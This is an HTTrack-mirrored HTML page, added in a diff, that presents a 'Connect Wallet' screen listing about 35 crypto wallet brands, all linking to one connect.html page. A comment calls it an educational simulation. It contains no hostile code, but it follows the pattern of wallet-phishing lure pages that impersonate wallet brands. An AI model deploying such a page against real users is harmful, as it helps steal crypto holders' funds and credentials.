@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from securedconnect.netlify.app/wallet by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - SecureDApp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #0a0a0f;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated background particles */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(0, 188, 212, 0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 50%, rgba(124, 77, 255, 0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 100%, rgba(0, 188, 212, 0.03) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .grid-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 188, 212, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 188, 212, 0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Floating orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 0;
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+
+        .orb-1 {
+            width: 300px; height: 300px;
+            background: rgba(0, 188, 212, 0.08);
+            top: -100px; right: -100px;
+            animation-delay: 0s;
+        }
+
+        .orb-2 {
+            width: 400px; height: 400px;
+            background: rgba(124, 77, 255, 0.06);
+            bottom: -150px; left: -150px;
+            animation-delay: -7s;
+        }
+
+        .orb-3 {
+            width: 200px; height: 200px;
+            background: rgba(0, 230, 118, 0.04);
+            top: 50%; left: 50%;
+            animation-delay: -14s;
+        }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -40px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 188, 212, 0.1);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            position: relative;
+            z-index: 1;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: containerAppear 0.6s ease-out;
+        }
+
+        .container::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .container::-webkit-scrollbar-thumb {
+            background: rgba(0, 188, 212, 0.3);
+            border-radius: 2px;
+        }
+
+        @keyframes containerAppear {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.98);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* Back Button */
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 20px;
+            z-index: 10;
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(0, 188, 212, 0.4);
+            transform: translateX(-3px);
+            color: #00bcd4;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 10px;
+        }
+
+        .header-badge {
+            display: inline-block;
+            background: rgba(0, 188, 212, 0.1);
+            border: 1px solid rgba(0, 188, 212, 0.2);
+            color: #00bcd4;
+            padding: 4px 16px;
+            border-radius: 50px;
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: #ffffff;
+            margin-bottom: 8px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+        }
+
+        /* Animated line */
+        .header-line {
+            position: relative;
+            width: 80px;
+            height: 2px;
+            margin: 20px auto 0;
+            background: linear-gradient(90deg, transparent, #00bcd4, transparent);
+            border-radius: 1px;
+            overflow: hidden;
+        }
+
+        .header-line::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
+            animation: lineShimmer 2.5s ease-in-out infinite;
+        }
+
+        @keyframes lineShimmer {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
+        /* Search / Filter */
+        .search-section {
+            margin-bottom: 20px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 12px 16px 12px 40px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .search-input::placeholder {
+            color: rgba(255, 255, 255, 0.25);
+        }
+
+        .search-input:focus {
+            border-color: rgba(0, 188, 212, 0.4);
+            background: rgba(255, 255, 255, 0.06);
+            box-shadow: 0 0 20px rgba(0, 188, 212, 0.05);
+        }
+
+        .search-wrapper {
+            position: relative;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 16px;
+            pointer-events: none;
+        }
+
+        /* Wallet Grid */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            color: inherit;
+            position: relative;
+            overflow: hidden;
+            animation: walletAppear 0.5s ease-out backwards;
+        }
+
+        .wallet-item::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, rgba(0, 188, 212, 0.05), transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .wallet-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: rgba(0, 188, 212, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .wallet-item:hover::before {
+            opacity: 1;
+        }
+
+        .wallet-item:active {
+            transform: scale(0.97);
+        }
+
+        /* Wallet icon container */
+        .wallet-icon-wrapper {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 20px;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-info {
+            flex-grow: 1;
+            min-width: 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #ffffff;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .wallet-tag {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.3);
+            margin-top: 1px;
+        }
+
+        .wallet-arrow {
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 14px;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+            flex-shrink: 0;
+        }
+
+        .wallet-item:hover .wallet-arrow {
+            transform: translateX(4px);
+            color: #00bcd4;
+        }
+
+        /* Wallet appear animation delays */
+        @keyframes walletAppear {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.25);
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #00bcd4;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .footer a:hover {
+            color: #7c4dff;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+        }
+
+        .social-link {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255, 255, 255, 0.3);
+            text-decoration: none;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .social-link:hover {
+            color: #00bcd4;
+            transform: translateY(-2px);
+        }
+
+        /* No results message */
+        .no-results {
+            text-align: center;
+            padding: 30px 20px;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 14px;
+            display: none;
+            grid-column: 1 / -1;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            body { padding: 12px; }
+            
+            .container {
+                padding: 28px 18px;
+                max-height: 95vh;
+            }
+
+            .wallet-grid {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+
+            .header h1 {
+                font-size: 22px;
+            }
+
+            .back-button {
+                top: 14px;
+                left: 14px;
+                width: 34px;
+                height: 34px;
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .wallet-item {
+                padding: 12px 14px;
+            }
+
+            .wallet-icon-wrapper {
+                width: 32px;
+                height: 32px;
+                font-size: 16px;
+                margin-right: 10px;
+            }
+
+            .wallet-name {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Effects -->
+    <div class="grid-overlay"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <!-- Main Container -->
+    <div class="container" id="container">
+
+        <!-- Back Button -->
+        <a class='back-button' href='index.html'>←</a>
+
+        <!-- Header -->
+        <div class="header">
+            <div class="header-badge">⚡ Secure Connection</div>
+            <h1>Connect Wallet</h1>
+            <p>Select your preferred wallet to continue</p>
+            <div class="header-line"></div>
+        </div>
+
+        <!-- Search -->
+        <div class="search-section">
+            <div class="search-wrapper">
+                <span class="search-icon">🔍</span>
+                <input type="text" class="search-input" id="searchInput" placeholder="Search wallets..." autocomplete="off">
+            </div>
+        </div>
+
+        <!-- Wallet Grid -->
+        <div class="wallet-grid" id="walletGrid">
+
+            <!-- Row 1: Major Wallets -->
+            <a class='wallet-item' data-name='MetaMask' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(246, 133, 27, 0.15);">🦊</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">MetaMask</div>
+                    <div class="wallet-tag">Popular</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='WalletConnect' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(59, 153, 252, 0.15);">🔗</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">WalletConnect</div>
+                    <div class="wallet-tag">Bridge</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Coinbase Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 82, 255, 0.15);">🔷</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Coinbase Wallet</div>
+                    <div class="wallet-tag">Self-Custody</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Phantom' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(171, 159, 242, 0.15);">👻</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Phantom</div>
+                    <div class="wallet-tag">Solana/EVM</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Trust Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(51, 117, 187, 0.15);">🛡️</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Trust Wallet</div>
+                    <div class="wallet-tag">Binance</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Exodus' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(11, 70, 249, 0.15);">💎</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Exodus</div>
+                    <div class="wallet-tag">Multi-Chain</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Rainbow' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: linear-gradient(135deg, rgba(255,107,107,0.2), rgba(78,205,196,0.2));">🌈</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Rainbow</div>
+                    <div class="wallet-tag">Ethereum</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Argent' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(255, 135, 91, 0.15);">🔐</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Argent</div>
+                    <div class="wallet-tag">StarkNet</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <!-- Row 2: Popular -->
+            <a class='wallet-item' data-name='Bitget Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 240, 255, 0.12);">💼</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Bitget Wallet</div>
+                    <div class="wallet-tag">Bitget</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='TokenPocket' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(41, 128, 254, 0.15);">🎒</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">TokenPocket</div>
+                    <div class="wallet-tag">Multi-Chain</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='SafePal' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(108, 93, 211, 0.15);">🔑</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">SafePal</div>
+                    <div class="wallet-tag">Hardware</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Solflare' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(252, 84, 255, 0.12);">☀️</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Solflare</div>
+                    <div class="wallet-tag">Solana</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Atomic Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(42, 102, 255, 0.15);">⚛️</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Atomic Wallet</div>
+                    <div class="wallet-tag">Multi-Asset</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='imToken' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(17, 196, 209, 0.15);">⏱️</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">imToken</div>
+                    <div class="wallet-tag">Ethereum</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Ledger' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 0, 0, 0.2);">📱</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Ledger</div>
+                    <div class="wallet-tag">Hardware</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Trezor' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(86, 86, 94, 0.15);">📀</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Trezor</div>
+                    <div class="wallet-tag">Hardware</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <!-- Row 3: Additional -->
+            <a class='wallet-item' data-name='Coinomi' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 195, 137, 0.15);">💚</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Coinomi</div>
+                    <div class="wallet-tag">Legacy</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Gnosis Safe' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 140, 115, 0.15);">🔒</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Gnosis Safe</div>
+                    <div class="wallet-tag">Multi-Sig</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Huobi Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(46, 174, 241, 0.15);">🌐</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Huobi Wallet</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Enjin' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(120, 102, 213, 0.15);">🎮</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Enjin</div>
+                    <div class="wallet-tag">Gaming</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Math Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(28, 129, 217, 0.15);">🧮</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Math Wallet</div>
+                    <div class="wallet-tag">Multi-Chain</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Zelcore' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(250, 188, 52, 0.15);">⚡</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Zelcore</div>
+                    <div class="wallet-tag">Multi-Asset</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Keplr' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(78, 148, 255, 0.15);">🌌</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Keplr</div>
+                    <div class="wallet-tag">Cosmos</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Terra Station' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 0, 0, 0.15);">🌍</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Terra Station</div>
+                    <div class="wallet-tag">Terra</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <!-- Row 4: More -->
+            <a class='wallet-item' data-name='OKX Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(27, 151, 255, 0.15);">🔵</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">OKX Wallet</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Bybit Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(227, 148, 0, 0.15);">🟠</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Bybit Wallet</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Kucoin Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 150, 210, 0.15);">🔹</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">KuCoin Wallet</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Gate.io Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 182, 122, 0.15);">🟢</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Gate.io Wallet</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Crypto.com DeFi' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(20, 50, 100, 0.15);">💳</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Crypto.com DeFi</div>
+                    <div class="wallet-tag">DeFi</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Binance Web3' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(243, 186, 47, 0.15);">💛</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Binance Web3</div>
+                    <div class="wallet-tag">Exchange</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Brave Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(255, 105, 0, 0.15);">🦁</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Brave Wallet</div>
+                    <div class="wallet-tag">Browser</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Opera Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(204, 0, 0, 0.15);">🌐</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Opera Wallet</div>
+                    <div class="wallet-tag">Browser</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+            <a class='wallet-item' data-name='TonKeeper' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(0, 0, 0, 0.15);">🌍</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">TonKeeper</div>
+                    <div class="wallet-tag">TonKeeper</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <!-- Row 4: More -->
+            <a class='wallet-item' data-name='Rabby Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(27, 151, 255, 0.15);">🔵</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Rabby Wallet</div>
+                    <div class="wallet-tag">Rabby</div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <a class='wallet-item' data-name='Other Wallet' href='connect.html'>
+                <div class="wallet-icon-wrapper" style="background: rgba(227, 148, 0, 0.15);">🟠</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Other Wallett</div>
+                    <div class="wallet-tag"></div>
+                </div>
+                <span class="wallet-arrow">→</span>
+            </a>
+
+            <!-- No Results -->
+            <div class="no-results" id="noResults">No wallets found matching your search.</div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Don't see your wallet? <a href="#">Request addition</a> or use <a href="#">WalletConnect</a></p>
+            <div class="social-links">
+                <a href="#" class="social-link"><span>💬</span> Discord</a>
+                <a href="#" class="social-link"><span>🐦</span> Twitter</a>
+                <a href="#" class="social-link"><span>💻</span> GitHub</a>
+                <a href="#" class="social-link"><span>📄</span> Docs</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // Search / Filter Functionality
+        // ============================================
+        const searchInput = document.getElementById('searchInput');
+        const walletItems = document.querySelectorAll('.wallet-item');
+        const noResults = document.getElementById('noResults');
+
+        searchInput.addEventListener('input', function() {
+            const query = this.value.toLowerCase().trim();
+            let visibleCount = 0;
+
+            walletItems.forEach(item => {
+                const name = item.getAttribute('data-name').toLowerCase();
+                const matches = !query || name.includes(query);
+                item.style.display = matches ? 'flex' : 'none';
+                if (matches) visibleCount++;
+            });
+
+            noResults.style.display = visibleCount === 0 ? 'block' : 'none';
+        });
+
+        // ============================================
+        // Staggered Animation on Load
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            const items = document.querySelectorAll('.wallet-item');
+            items.forEach((item, index) => {
+                const delay = 0.03 * index;
+                item.style.animationDelay = delay + 's';
+            });
+        });
+
+        // ============================================
+        // Click Effect
+        // ============================================
+        walletItems.forEach(item => {
+            item.addEventListener('mousedown', function() {
+                this.style.transform = 'scale(0.97)';
+            });
+            item.addEventListener('mouseup', function() {
+                this.style.transform = '';
+            });
+            item.addEventListener('mouseleave', function() {
+                this.style.transform = '';
+            });
+        });
+
+        // ============================================
+        // Back Button: fallback to index.html
+        // ============================================
+        document.querySelector('.back-button').addEventListener('click', function(e) {
+            // Allow default navigation to index.html
+        });
+
+        // ============================================
+        // Console greeting (cybersecurity class touch)
+        // ============================================
+        console.log('%c🔐 SecureDApp Wallet Interface', 'font-size: 18px; font-weight: bold; color: #00bcd4;');
+        console.log('%cThis is a simulated wallet connection page for educational purposes.', 'color: rgba(255,255,255,0.5);');
+        console.log('%c🔍 Wallet selection loaded: ' + walletItems.length + ' wallets available', 'color: #00e676;');
+    </script>
+</body>
+
+<!-- Mirrored from securedconnect.netlify.app/wallet by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:02 GMT -->
+</html>
